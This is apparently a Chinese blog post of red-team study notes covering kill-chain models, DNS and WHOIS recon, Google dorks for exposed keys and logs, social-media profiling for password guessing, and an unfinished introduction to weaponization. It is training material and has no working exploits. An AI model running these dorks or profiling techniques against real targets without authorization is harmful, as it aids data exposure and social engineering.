Martin Cyber Kill Chain（洛克希德·马丁攻击链）</strong><br> 2️⃣ <strong>Unified Kill Chain（统一攻击链）</strong><br> 3️⃣ <strong>Varonis Cyber Kill Chain（Varonis 攻击链）</strong><br> 4️⃣ <strong>Active Directory Attack Cycle（AD 攻击周期）</strong><br> 5️⃣ <strong>MITRE ATT&amp;CK Framework（MITRE ATT&amp;CK 框架）</strong></p><p>在本次讨论中，我们主要参考 <strong>Lockheed Martin Cyber Kill Chain</strong>，它是目前<strong>红队和蓝队最常使用的标准攻击链模型</strong>。</p><hr><h5 id="3-Lockheed-Martin-Cyber-Kill-Chain"><a href="#3-Lockheed-Martin-Cyber-Kill-Chain" class="headerlink" title="3. Lockheed Martin Cyber Kill Chain"></a><strong>3. Lockheed Martin Cyber Kill Chain</strong></h5><p>该模型主要<strong>聚焦于外围攻击</strong>（如外部网络入侵），但<strong>对攻击者在内网中的横向移动缺乏详细描述</strong>。<br> 可以将其视为<strong>攻击过程中所有行为和操作的概述</strong>。</p><table><thead><tr><th><strong>阶段（Technique）</strong></th><th><strong>目的（Purpose）</strong></th><th><strong>示例（Examples）</strong></th></tr></thead><tbody><tr><td><strong>侦察（Reconnaissance）</strong></td><td>获取目标信息</td><td>收集电子邮件、OSINT（开源情报）</td></tr><tr><td><strong>武器化（Weaponization）</strong></td><td>结合攻击目标与漏洞，生成可利用的恶意载荷</td><td>利用漏洞嵌入后门、恶意 Office 文档</td></tr><tr><td><strong>投递（Delivery）</strong></td><td>通过某种方式向目标发送恶意载荷</td><td>电子邮件、网页、USB 设备</td></tr><tr><td><strong>利用（Exploitation）</strong></td><td>利用漏洞执行恶意代码</td><td>MS17-010、Zero-Logon 等</td></tr><tr><td><strong>安装（Installation）</strong></td><td>安装恶意软件或攻击工具</td><td>Mimikatz、Rubeus 等</td></tr><tr><td><strong>命令与控制（Command &amp; Control）</strong></td><td>远程控制受感染系统</td><td>Empire、Cobalt Strike 等</td></tr><tr><td><strong>达成目标（Actions on Objectives）</strong></td><td>执行最终攻击目的，如勒索软件或数据窃取</td><td>Conti 勒索软件、LockBit2.0 等</td></tr></tbody></table><hr><h4 id="4-关键点总结-1"><a href="#4-关键点总结-1" class="headerlink" title="4. 关键点总结"></a><strong>4. 关键点总结</strong></h4><p>✅ <strong>红队利用攻击链来模拟真实攻击，评估企业的安全防御能力。</strong><br> ✅ <strong>攻击链用于分析攻击者行为，红队和蓝队都可以参考这一模型进行防御优化。</strong><br> ✅ <strong>Lockheed Martin Cyber Kill Chain 主要关注外部攻击，适合用于网络边界防御的安全评估。</strong><br> ✅ <strong>攻击链的每个阶段都有对应的攻击方法和工具，企业可以据此强化不同环节的安全防御措施。</strong></p><h2 id="红队侦察"><a href="#红队侦察" class="headerlink" title="红队侦察"></a>红队侦察</h2><h3 id="侦察分类"><a href="#侦察分类" class="headerlink" title="侦察分类"></a>侦察分类</h3><p><strong>侦察（Reconnaissance, recon）可以分为两个部分：</strong></p><ol><li><strong>被动侦察（Passive Recon）</strong>：可以通过被动观察目标进行。</li><li><strong>主动侦察（Active Recon）</strong>：需要与目标进行交互，以诱导其产生响应并进行观察。</li></ol><h4 id="被动侦察（Passive-Recon）"><a href="#被动侦察（Passive-Recon）" class="headerlink" title="被动侦察（Passive Recon）"></a><strong>被动侦察（Passive Recon）</strong></h4><p>被动侦察不需要直接与目标交互，换句话说，攻击者不会向目标或其所属系统发送任何数据包或请求。相反，被动侦察依赖于<strong>第三方收集和维护的公开可用信息</strong>，通常利用**开源情报（OSINT, Open Source Intelligence）**来获取目标信息。这种侦察方法可能涉及查看目标**公开的社交媒体资料**等。</p><p>一些可能收集到的信息包括：</p><ul><li><strong>域名（Domain Names）</strong></li><li><strong>IP 地址块（IP Address Blocks）</strong></li><li><strong>电子邮件地址（Email Addresses）</strong></li><li><strong>员工姓名（Employee Names）</strong></li><li><strong>职位招聘信息（Job Posts）</strong></li></ul><p>在接下来的任务中，我们将学习如何查询<strong>DNS 记录</strong>，并在“<strong>被动侦察</strong>”的基础上进一步扩展，引入更高级的工具来帮助我们进行信息收集。</p><hr><h4 id="主动侦察（Active-Recon）"><a href="#主动侦察（Active-Recon）" class="headerlink" title="主动侦察（Active Recon）"></a><strong>主动侦察（Active Recon）</strong></h4><p>主动侦察需要直接与目标交互，即通过发送请求或数据包来观察目标的响应情况。这些<strong>收集到的响应</strong>（或者没有响应的情况）可以帮助我们完善通过<strong>被动侦察</strong>所构建的目标信息。</p><p><strong>主动侦察的示例</strong>：</p><ul><li>使用 <strong>Nmap</strong> 扫描目标子网和存活主机。</li><li>其他主动侦察工具可在**主动侦察（Active Reconnaissance）**相关内容中找到。</li></ul><p><strong>我们希望通过主动侦察发现的信息包括：</strong></p><ul><li><strong>存活主机（Live Hosts）</strong></li><li><strong>运行的服务器（Running Servers）</strong></li><li><strong>监听的服务（Listening Services）</strong></li><li><strong>软件版本号（Version Numbers）</strong></li></ul><hr><h4 id="主动侦察的分类"><a href="#主动侦察的分类" class="headerlink" title="主动侦察的分类"></a><strong>主动侦察的分类</strong></h4><p>主动侦察可以进一步细分为：</p><ol><li><strong>外部侦察（External Recon）</strong><ul><li>在目标的网络<strong>外部</strong>进行，主要针对<strong>互联网可访问的外部资产</strong>。</li><li>示例：使用 <strong>Nikto</strong> 在公司网络外部扫描其 Web 服务器。</li></ul></li><li><strong>内部侦察（Internal Recon）</strong><ul><li>在目标公司的<strong>内部网络</strong>中进行。</li><li>例如，渗透测试人员或红队成员可能<strong>物理地位于公司内部</strong>，或通过已经被攻陷的主机进行侦察。</li><li>示例：使用 <strong>Nessus</strong> 通过目标内部网络中的某台计算机扫描内部资产。</li></ul></li></ol><h3 id="内置工具"><a href="#内置工具" class="headerlink" title="内置工具"></a>内置工具</h3><p>本任务重点介绍以下工具的使用：</p><ul><li><strong>whois</strong></li><li><strong>dig、nslookup、host</strong></li><li><strong>traceroute&#x2F;tracert</strong></li></ul><p>在我们开始使用 <strong>whois</strong> 工具之前，先了解一下 <strong>WHOIS</strong>。</p><p><strong>WHOIS</strong> 是一种基于请求-响应模式的协议，遵循 <strong>RFC 3912</strong> 规范。WHOIS 服务器会在 <strong>TCP 端口 43</strong> 上监听传入的查询请求。</p><p><strong>域名注册商（Registrar）</strong> 负责维护其租赁的<strong>域名 WHOIS 记录</strong>。当我们使用 <strong>whois</strong> 命令查询时，它会向 WHOIS 服务器请求信息，并返回该域名的所有已存储记录。</p><p>在以下示例中，whois 查询结果可能包含以下信息：</p><ul><li><strong>注册商 WHOIS 服务器地址（Registrar WHOIS server）</strong></li><li><strong>注册商官网 URL（Registrar URL）</strong></li><li><strong>记录创建日期（Record creation date）</strong></li><li><strong>记录更新日期（Record update date）</strong></li><li><strong>注册人联系方式和地址（Registrant contact info and address）</strong>（若未启用隐私保护）</li><li><strong>管理员联系方式和地址（Admin contact info and address）</strong>（若未启用隐私保护）</li><li><strong>技术联系方式和地址（Tech contact info and address）</strong>（若未启用隐私保护）</li></ul><h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><p><img src="/../imgs/$%7Bfiilename%7D/image-20250322194629077.png" alt="image-20250322194629077"></p><p>我们用ai整理信息更为直观</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250322194656108.png" alt="image-20250322194656108"></p><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure><p>该命令用于查询 <code>baidu.com</code> 的 DNS 解析情况。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=AAAA baidu.com</span><br></pre></td></tr></table></figure><p>查询 IPv6 地址（AAAA 记录）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure><p>使用 8.8.8.8 查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=MX baidu.com</span><br></pre></td></tr></table></figure><p>查询 MX（邮件交换）记录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=NS baidu.com</span><br></pre></td></tr></table></figure><p>查询 NS（Name Server）记录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -query=TXT baidu.com</span><br></pre></td></tr></table></figure><p>查询 TXT 记录</p><h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><p>在类 Unix 系统中，另一个常见的 DNS 查询工具是 <strong>dig</strong>，全称 <strong>Domain Information Groper</strong>（域名信息查询工具）。<br> <code>dig</code> 提供了丰富的查询选项，甚至允许你指定不同的 <strong>DNS 服务器</strong> 进行查询。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250322210648448.png" alt="image-20250322210648448"></p><p>很显然dig的信息更为详细</p><h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p> 解析 <code>A 记录</code>（IPv4 地址）</p><p> 解析 <code>MX 记录</code>（邮件服务器）</p><p><strong>如果只是快速查 IP 地址或 MX 记录，<code>host</code> 最方便</strong>。</p><p><strong>如果需要更详细的 DNS 解析过程，推荐使用 <code>dig</code></strong>。</p><h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p>最后一个 Unix 类系统自带的工具是 <code>traceroute</code>，在 Windows 系统上称为 <code>tracert</code>。顾名思义，它用于 <strong>跟踪数据包从我们的系统到目标主机所经过的路由</strong>。</p><p>下面的终端输出展示了 <code>traceroute</code> 解析出的 <strong>连接我们与目标系统的路由器（跳点）</strong>。<br> 需要强调的是：<strong>某些路由器不会响应 <code>traceroute</code> 发送的数据包</strong>，因此我们无法看到它们的 IP 地址，在这种情况下，<code>traceroute</code> 会用 <code>*</code> 号表示这些不可见的路由器。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250322212244360.png" alt="image-20250322212244360"></p><h3 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h3><p>能够高效使用搜索引擎是一项至关重要的技能。以下表格展示了一些在多个流行搜索引擎中常用的搜索修饰符：</p><table><thead><tr><th><strong>符号 &#x2F; 语法</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td><code>&quot;search phrase&quot;</code></td><td>查找完全匹配的短语</td></tr><tr><td><code>OSINT filetype:pdf</code></td><td>查找与特定术语相关的 PDF 文件</td></tr><tr><td><code>salary site:blog.tryhackme.com</code></td><td>将搜索结果限制在特定网站</td></tr><tr><td><code>pentest -site:example.com</code></td><td>排除特定网站的搜索结果</td></tr><tr><td><code>walkthrough intitle:TryHackMe</code></td><td>查找标题包含特定术语的网页</td></tr><tr><td><code>challenge inurl:tryhackme</code></td><td>查找 URL 包含特定术语的网页</td></tr></tbody></table><p>🔹 <strong>分析</strong>：</p><ul><li><code>filetype:</code> 可以用于搜索多种文件类型，如 <code>doc, docx, ppt, pptx, xls, xlsx</code> 等，这在 <strong>OSINT（开源情报）</strong> 领域非常有用。</li><li><code>site:</code> 让用户能够精准搜索特定网站，而 <code>-site:</code> 则用于排除某个网站的内容。</li><li><code>intitle:</code> 和 <code>inurl:</code> 有助于定位特定网页，如 <code>inurl:admin</code> 可能会返回管理员面板页面。</li></ul><p>每个搜索引擎的规则和语法可能略有不同，因此用户需要查阅其帮助页面。例如：</p><ul><li><a href="https://www.google.com/advanced_search">Google 高级搜索</a> 提供了一个可视化界面，帮助用户构造高级查询。</li><li><a href="https://support.google.com/websearch/answer/2466433">Google Refine Web Searches</a> 详细介绍了 Google 的高级搜索技巧。</li><li><a href="https://help.duckduckgo.com/advanced-search/">DuckDuckGo Search Syntax</a> 适用于 DuckDuckGo。</li><li><a href="https://www.bing.com/search?q=Bing+advanced+search+options">Bing Advanced Search Options</a> 适用于 Bing。</li></ul><hr><h5 id="搜索引擎如何泄露敏感信息？"><a href="#搜索引擎如何泄露敏感信息？" class="headerlink" title="搜索引擎如何泄露敏感信息？"></a><strong>搜索引擎如何泄露敏感信息？</strong></h5><p>搜索引擎会不断抓取并索引全球网页，这可能导致机密信息被意外公开，如：</p><ul><li><strong>内部公司文档</strong></li><li><strong>包含用户名、电子邮件、甚至密码的表格</strong></li><li><strong>存储敏感数据的目录</strong></li><li><strong>Web 服务的版本信息（可能存在漏洞）</strong></li><li><strong>错误日志（可能暴露系统详细信息）</strong></li></ul><p>📌 <strong>分析</strong>：<br> 这些敏感信息可能通过 Google Dorking（谷歌黑客技巧）被轻松找到。Google Hacking Database（GHDB）收集了许多用于挖掘敏感信息的搜索语句，例如：</p><table><thead><tr><th><strong>GHDB 类别</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>Footholds</strong>（初始访问点）</td><td><code>intitle:&quot;index of&quot; &quot;nginx.log&quot;</code> （查找 Nginx 日志，可能暴露服务器配置信息）</td></tr><tr><td><strong>Files Containing Usernames</strong>（包含用户名的文件）</td><td><code>intitle:&quot;index of&quot; &quot;contacts.txt&quot;</code> （查找联系人信息）</td></tr><tr><td><strong>Sensitive Directories</strong>（敏感目录）</td><td><code>inurl:/certs/server.key</code> （查找是否有私钥泄露）</td></tr><tr><td><strong>Web Server Detection</strong>（检测 Web 服务器）</td><td><code>intitle:&quot;GlassFish Server - Server Running&quot;</code> （识别 GlassFish 服务器）</td></tr><tr><td><strong>Vulnerable Files</strong>（易受攻击的文件）</td><td><code>intitle:&quot;index of&quot; &quot;*.php&quot;</code> （搜索可执行 PHP 文件）</td></tr><tr><td><strong>Vulnerable Servers</strong>（易受攻击的服务器）</td><td><code>intext:&quot;user name&quot; intext:&quot;orion core&quot; -solarwinds.com</code> （查找 SolarWinds Orion 控制台）</td></tr><tr><td><strong>Error Messages</strong>（错误信息）</td><td><code>intitle:&quot;index of&quot; errors.log</code> （查找错误日志文件）</td></tr></tbody></table><p><strong>重要提醒</strong> ⚠️： 这些查询会返回所有符合条件的公开数据，可能包含敏感信息。为了避免法律问题，<strong>请确保仅在授权范围内使用这些搜索技巧</strong>。</p><hr><h5 id="其他-OSINT-数据来源"><a href="#其他-OSINT-数据来源" class="headerlink" title="其他 OSINT 数据来源"></a><strong>其他 OSINT 数据来源</strong></h5><p>除了搜索引擎，以下来源也能提供有价值的信息：</p><ol><li><strong>社交媒体（Social Media）</strong><ul><li>人们可能会在 LinkedIn、Twitter、Facebook 等平台上发布公司相关信息，如员工名单、内部项目、电子邮件格式等。</li><li><code>site:linkedin.com &quot;company name&quot; &quot;job title&quot;</code> 可以帮助定位公司员工。</li></ul></li><li><strong>招聘广告（Job Ads）</strong><ul><li>企业在招聘广告中可能会透露其使用的技术栈，例如：“要求熟悉 <strong>AWS, Kubernetes, Python</strong>” 可能暗示公司使用这些技术。</li><li><code>site:indeed.com &quot;company name&quot; &quot;hiring&quot;</code> 可用于收集公司招聘相关信息。</li></ul></li></ol><p>📌 <strong>总结</strong>：</p><ul><li><strong>善用搜索修饰符</strong>，如 <code>filetype:</code>, <code>site:</code>, <code>intitle:</code>, <code>inurl:</code> 等，进行精准搜索。</li><li><strong>利用 GHDB（Google Hacking Database）</strong> 发现潜在的敏感信息。</li><li><strong>结合社交媒体和招聘广告</strong> 进行 OSINT 调查，无需直接访问目标系统。</li></ul><p>🔎 <strong>推荐进一步学习</strong>：</p><ul><li>访问 <strong>Google Dorking 练习场</strong>，提高搜索技能。</li><li>探索 <strong>Shodan.io</strong>，该搜索引擎专门用于查找在线设备（如摄像头、路由器、数据库服务器等）。</li><li>了解 <strong>TheHarvester</strong>，这是一款自动化 OSINT 工具，可用于收集电子邮件、子域名、员工信息等。</li></ul><p>这样，你可以在合法范围内高效收集有价值的信息，同时避免不必要的法律风险。 🚀</p><h5 id="社交媒体"><a href="#社交媒体" class="headerlink" title="社交媒体"></a><strong>社交媒体</strong></h5><p>社交媒体网站不仅在个人用途上非常流行，同时在企业应用方面也被广泛使用。这些平台可能会暴露大量与目标相关的信息。尤其是许多用户往往会过度分享自己的个人和工作细节，因此值得重点关注以下平台：</p><ul><li><strong>LinkedIn</strong>（领英）</li><li><strong>Twitter</strong>（推特）</li><li><strong>Facebook</strong>（脸书）</li><li><strong>Instagram</strong>（照片墙）</li></ul><p>社交媒体网站使得收集某个公司员工的姓名变得十分容易。此外，在某些情况下，你可能会获取特定的信息，这些信息可能揭示密码找回问题的答案，或者为定制化字典（wordlist）提供线索。技术人员的帖子可能会透露有关公司系统和供应商的详细信息。例如，如果一名网络工程师最近获得了 <strong>Juniper（瞻博网络）</strong> 认证，这可能暗示其公司环境中使用了 Juniper 的网络基础设施。</p><hr><h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a><strong>分析</strong></h6><p>📌 <strong>1. 社交媒体在 OSINT（开源情报）中的作用</strong></p><ul><li><strong>信息收集</strong>：社交平台可以帮助黑客或安全研究员收集目标公司的员工信息、技术栈、内部项目等。</li><li><strong>社会工程学攻击（Social Engineering）</strong>：过度分享的个人信息（如宠物名字、出生日期、喜欢的电影）可能用于 <strong>密码重置问题</strong> 或 <strong>密码猜测</strong>。</li><li><strong>目标字典（Wordlist Generation）</strong>：可以从用户的公开信息（如昵称、工作经历、兴趣爱好）生成用于暴力破解的字典。</li></ul><p>📌 <strong>2. 各大社交平台的 OSINT 价值</strong></p><table><thead><tr><th><strong>社交平台</strong></th><th><strong>可获取的信息</strong></th><th><strong>潜在用途</strong></th></tr></thead><tbody><tr><td><strong>LinkedIn</strong></td><td>公司员工名单、职位、技术栈、工作经历</td><td>构建公司组织架构，分析技术使用情况</td></tr><tr><td><strong>Twitter</strong></td><td>公开言论、兴趣爱好、生活细节</td><td>获取个人背景，识别可利用的信息</td></tr><tr><td><strong>Facebook</strong></td><td>朋友列表、照片、兴趣、位置记录</td><td>用于社会工程学攻击、身份伪造</td></tr><tr><td><strong>Instagram</strong></td><td>生活照片、打卡位置、关注列表</td><td>了解目标社交圈，分析生活习惯</td></tr></tbody></table><p>📌 <strong>3. 案例分析</strong></p><ul><li><strong>案例 1：密码猜测</strong><ul><li>目标在 Instagram 上晒宠物照，并配文：“这是我最爱的狗狗 Max！”</li><li>可能的密码：<code>Max123</code>, <code>ILoveMax</code>, <code>Max2025!</code></li><li>如果他用相似密码进行工作登录，就可能成为攻击目标。</li></ul></li><li><strong>案例 2：供应链攻击</strong><ul><li>目标公司员工在 LinkedIn 上发帖：“很高兴我们公司最近部署了 Palo Alto 防火墙！”</li><li>可能的利用点：攻击者可以寻找 Palo Alto 的已知漏洞，或者针对相关厂商进行供应链攻击。</li></ul></li></ul><hr><h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h6><p>✅ <strong>社交媒体是 OSINT 调查的重要工具</strong>，可以获取大量目标相关的信息。<br> ✅ <strong>用户的过度分享可能成为安全隐患</strong>，需要注意隐私保护。<br> ✅ <strong>攻击者可以利用这些信息进行社会工程学攻击</strong>，如密码猜测、目标字典生成等。<br> ✅ <strong>企业应加强安全意识培训</strong>，避免员工在社交媒体上泄露敏感信息。</p><p>🔎 <strong>推荐工具</strong>：</p><ul><li><strong>theHarvester</strong>：自动收集 LinkedIn、Twitter 等社交平台上的公司和员工信息。</li><li><strong>Maltego</strong>：可视化社交网络分析工具，用于挖掘目标的社交关系。</li><li><strong>Google Dorking</strong>：结合 <code>site:linkedin.com</code> 等搜索技巧，精准定位社交媒体信息。</li></ul><p>这样，你可以在合法范围内高效利用社交媒体进行 OSINT 研究，同时避免不必要的安全风险！ 🚀</p><h5 id="招聘广告（Job-Ads）"><a href="#招聘广告（Job-Ads）" class="headerlink" title="招聘广告（Job Ads）"></a><strong>招聘广告（Job Ads）</strong></h5><p>招聘广告也能透露许多有关公司的信息。除了可能暴露姓名和电子邮件地址外，<strong>技术职位</strong>的招聘信息还可能提供关于目标公司<strong>系统和基础设施</strong>的线索。不同国家流行的招聘网站可能有所不同，因此，请务必查看客户公司可能发布招聘信息的国家的求职网站。此外，访问公司官网上的<strong>招聘页面</strong>，也可能会获取一些有价值的信息。</p><p>值得注意的是，<strong>Wayback Machine（互联网档案馆）</strong> 可以用来<strong>检索公司招聘页面的历史版本</strong>，帮助分析过去的技术变更和相关信息。</p><h3 id="专业搜索引擎"><a href="#专业搜索引擎" class="headerlink" title="专业搜索引擎"></a>专业搜索引擎</h3><h4 id="WHOIS-和-DNS-相关信息（WHOIS-and-DNS-Related）"><a href="#WHOIS-和-DNS-相关信息（WHOIS-and-DNS-Related）" class="headerlink" title="WHOIS 和 DNS 相关信息（WHOIS and DNS Related）"></a><strong>WHOIS 和 DNS 相关信息（WHOIS and DNS Related）</strong></h4><p>除了我们在 介绍的标准 <strong>WHOIS</strong> 和 <strong>DNS 查询工具</strong>，还有一些<strong>第三方机构</strong>提供<strong>付费的历史 WHOIS 数据</strong>服务。例如，<strong>WHOIS history</strong> 提供<strong>WHOIS 记录的历史数据</strong>，如果域名注册者<strong>没有使用 WHOIS 隐私保护</strong>，这类服务可能会非常有用。</p><p>目前，有一些网站提供<strong>免费的高级 DNS 服务</strong>，这些网站功能<strong>强大</strong>，甚至可以专门为某个域名提供深入分析。这里，我们重点关注<strong>关键的 DNS 相关信息</strong>，主要包括以下内容：</p><ol><li><strong>ViewDNS.info</strong></li><li><strong>Threat Intelligence Platform</strong></li></ol><h4 id="ViewDNS-info"><a href="#ViewDNS-info" class="headerlink" title="ViewDNS.info"></a><strong>ViewDNS.info</strong></h4><p><strong>ViewDNS.info</strong> 提供 <strong>反向 IP 查询（Reverse IP Lookup）</strong>。</p><p><strong>背景知识</strong>：</p><ul><li>传统上，每台<strong>Web 服务器</strong>都会使用一个或多个<strong>唯一的 IP 地址</strong>。</li><li>但如今，**共享主机（Shared Hosting）*<em>越来越普遍，**多个不同的域名**可能会共享*<em>同一个 IP 地址</em></em>。</li><li><strong>反向 IP 查询</strong> 允许我们通过<strong>一个域名或 IP 地址</strong>，找到<strong>所有与该 IP 地址关联的其他域名</strong>。</li></ul><p><strong>示例分析</strong>：<br> 在下面的示例中，我们使用<strong>反向 IP 查询</strong>找出了与 <strong>cafe.thmredteam.com</strong> 共享相同 IP 地址的<strong>其他服务器</strong>。<br> 因此，仅仅知道某个<strong>IP 地址</strong>，并不一定意味着它<strong>只对应一个特定的网站</strong>，它可能属于<strong>多个网站的共享服务器</strong>。</p><hr><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a><strong>分析</strong></h4><p>📌 <strong>1. 为什么历史 WHOIS 数据重要？</strong></p><ul><li>如果目标网站<strong>现在</strong>使用了 WHOIS 隐私保护（如 Cloudflare 或 GoDaddy 提供的匿名服务），那么<strong>当前 WHOIS 数据可能无法获取具体的注册人信息</strong>。</li><li>但如果该域名<strong>过去</strong>没有开启隐私保护，历史 WHOIS 记录可能包含<strong>原始的注册人信息、电子邮件、注册公司等</strong>。</li><li>这对**渗透测试、OSINT 调查和社工攻击（Social Engineering）**都很有帮助。</li></ul><p>📌 <strong>2. 反向 IP 查询的应用场景</strong></p><table><thead><tr><th><strong>场景</strong></th><th><strong>作用</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td><strong>共享主机</strong></td><td>查找与目标 IP 关联的其他域名</td><td>发现同服务器上的潜在目标</td></tr><tr><td><strong>子域名发现</strong></td><td>通过同一 IP 地址推测可能的子域名</td><td>扩展攻击面，发现隐藏服务</td></tr><tr><td><strong>旁站攻击</strong></td><td>发现同服务器上的其他网站</td><td>通过弱点网站进入目标服务器</td></tr><tr><td><strong>识别恶意活动</strong></td><td>追踪黑客控制的多个网站</td><td>威胁情报分析</td></tr></tbody></table><p>📌 <strong>3. OSINT 工具推荐</strong></p><ul><li><strong>ViewDNS.info（<a href="https://viewdns.info)/">https://viewdns.info）</a></strong><ul><li>提供反向 IP 查询、WHOIS 历史、DNS 记录等功能。</li></ul></li><li><strong>SecurityTrails（<a href="https://securitytrails.com)/">https://securitytrails.com）</a></strong><ul><li>提供详细的<strong>历史 DNS 记录</strong>，包括<strong>A 记录、MX 记录</strong>等。</li></ul></li><li><strong>Threat Intelligence Platform（<a href="https://threatintelligenceplatform.com)/">https://threatintelligenceplatform.com）</a></strong><ul><li>分析域名的安全状况，识别恶意行为。</li></ul></li></ul><hr><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>✅ <strong>历史 WHOIS 数据可以挖掘域名的注册人信息，特别是在没有启用 WHOIS 隐私保护的情况下。</strong><br> ✅ <strong>反向 IP 查询可以发现与目标 IP 共享的其他网站，有助于扩展攻击面（旁站攻击）。</strong><br> ✅ <strong>多个在线工具（如 ViewDNS.info、SecurityTrails）可以帮助进行 DNS 相关的 OSINT 调查。</strong><br> ✅ <strong>共享主机环境下，不能仅依赖 IP 地址识别唯一目标，需要结合子域名爆破等方法进行深入分析。</strong> 🚀</p><h4 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h4><p><a href="https://search.censys.io/">Censys Search</a> 可以提供大量有关 IP 地址和域的信息。在此示例中，我们查找解析为 的 IP 地址之一。我们可以轻松推断出我们查找的 IP 地址属于 Cloudflare。我们可以看到与端口 80 和 443 等相关的信息；但是，很明显，此 IP 地址用于为除 之外的网站提供服务。换句话说，此 IP 地址属于我们的客户 <a href="https://cafe.thmredteam.com/">Organic Cafe</a> 以外的公司。做出这种区分至关重要，这样我们就不会探测合同范围之外的系统。</p><p><code>shodan host IP_ADDRESS</code> ，我们可以获取 IP 地址的地理位置和开放端口</p><h3 id="Recon-ng"><a href="#Recon-ng" class="headerlink" title="Recon-ng"></a>Recon-ng</h3><p>综合工具具有各种模块(和msf类似)</p><h3 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h3><p>Maltego 是一款强大的 <strong>信息收集与可视化分析工具</strong>，专为 <strong>OSINT（开源情报）</strong> 和 <strong>网络渗透测试</strong> 设计。它能够从 <strong>公开数据源</strong>（如搜索引擎、社交媒体、WHOIS、DNS、Shodan 等）收集信息，并以 <strong>图形化方式展示数据关联</strong>，帮助分析目标组织、人员、基础设施之间的关系。</p><p>Maltego 适用于：</p><ul><li><strong>网络安全分析</strong>：识别目标的网络资产（域名、IP、邮件、子域等）。</li><li><strong>威胁情报</strong>：发现恶意 IP、域名、漏洞等。</li><li><strong>企业调查</strong>：分析企业与个人的关系链。</li><li><strong>社交工程</strong>：挖掘人员信息（邮箱、社交媒体账户等）。</li><li><strong>执法调查</strong>：帮助警方分析犯罪网络。</li></ul><p>先<br><img src="/../imgs/$%7Bfiilename%7D/image-20250324214707813.png" alt="image-20250324214707813"></p><p>再</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250324214729683.png" alt="image-20250324214729683"></p><p>双击图标填上域名</p><p>再</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250324214812441.png" alt="image-20250324214812441"></p><h2 id="Weaponization-武器化-红队"><a href="#Weaponization-武器化-红队" class="headerlink" title="Weaponization(武器化)-红队"></a>Weaponization(武器化)-红队</h2><p><img src="/../imgs/$%7Bfiilename%7D/126ff098c0efeeeb8ab694a09b3359b0.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5c549500924ec576f953d9fc&#x2F;room-content&#x2F;126ff098c0efeeeb8ab694a09b3359b0.png"></p><p>什么是武器化（Weaponization）</p><p>武器化是网络攻击链（Cyber Kill Chain）模型的第二阶段。在此阶段，攻击者会生成并开发自己的恶意代码，通常通过 Word 文档、PDF 等可投递的载荷进行传播 [1]。武器化阶段的目标是利用恶意载荷来攻击目标机器，并获取初始访问权限。</p><p>大多数组织都运行 Windows 操作系统，因此它往往成为攻击的主要目标。为了防止安全漏洞，许多组织的环境策略会阻止下载和执行 <strong>.exe</strong> 文件。因此，红队成员通常会构建自定义载荷，并通过多种渠道投递，例如 <strong>网络钓鱼（Phishing）活动、社会工程（Social Engineering）、浏览器或软件漏洞利用、USB 设备、Web 方法</strong> 等。</p><p>下图展示了一个武器化的示例，其中一个精心制作的 PDF 或 Microsoft Office 文档被用于投递恶意载荷。该自定义载荷配置为回连至红队基础设施的指挥与控制（C2）环境。</p><p><img src="/../imgs/$%7Bfiilename%7D/734a353799fc9f3cd05bb7421ceedd00.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5d617515c8cd8348d0b4e68f&#x2F;room-content&#x2F;734a353799fc9f3cd05bb7421ceedd00.png"></p><p>欲了解更多关于红队工具包的信息，请访问以下资源：该 GitHub 仓库包含了所有相关内容，包括初始访问、载荷开发、投递方法等。</p><p>大多数组织都会阻止或监控 <strong>.exe</strong> 文件在其受控环境中的执行。因此，红队成员通常依赖其他技术来执行载荷，例如 Windows 内置的脚本技术。因此，本任务将重点介绍几种流行且有效的脚本技术，包括：</p><ul><li><strong>Windows Scripting Host（WSH）</strong></li><li><strong>HTML 应用程序（HTA）</strong></li><li><strong>Visual Basic 应用程序（VBA）</strong></li><li><strong>PowerShell（PSH）</strong></li></ul><h3 id="Windows-Scripting-Host-WSH"><a href="#Windows-Scripting-Host-WSH" class="headerlink" title="Windows Scripting Host (WSH)"></a>Windows Scripting Host (WSH)</h3><p>Windows Scripting Host 是 Windows 内置的管理工具，用于运行批处理脚本，以自动化和管理操作系统内的任务。</p><p>它是 Windows 原生的脚本引擎，主要包括 <strong>cscript.exe</strong>（用于命令行脚本）和 <strong>wscript.exe</strong>（用于 UI 脚本），负责执行各种 Microsoft Visual Basic 脚本（VBScript），包括 <strong>.vbs</strong> 和 <strong>.vbe</strong> 文件。关于 VBScript 的更多信息，请访问相关资源。</p><p>需要注意的是，Windows 操作系统中的 VBScript 